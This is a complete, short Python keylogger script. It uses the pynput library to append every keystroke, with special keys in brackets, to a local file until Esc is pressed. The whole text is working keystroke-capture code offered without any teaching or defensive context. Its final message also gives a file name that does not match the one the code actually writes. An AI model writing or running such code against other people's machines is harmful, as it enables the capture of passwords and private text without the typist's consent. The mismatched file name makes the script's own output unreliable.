from pynput import keyboard
log_file = "keylog.txt"
def when_a_key_is_pressed(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            else:
                f.write(f" [{key}] ")

def when_a_key_is_released(key):
    if key == keyboard.Key.esc:
        print("Ok, I'm stopping the logger now.")
        return False
print("Logger is running... Press the 'Esc' key to stop it.")
with keyboard.Listener(
        on_press=when_a_key_is_pressed,
        on_release=when_a_key_is_released) as my_listener:
    my_listener.join()
print("All done. Your log is saved to 'key_log.txt'")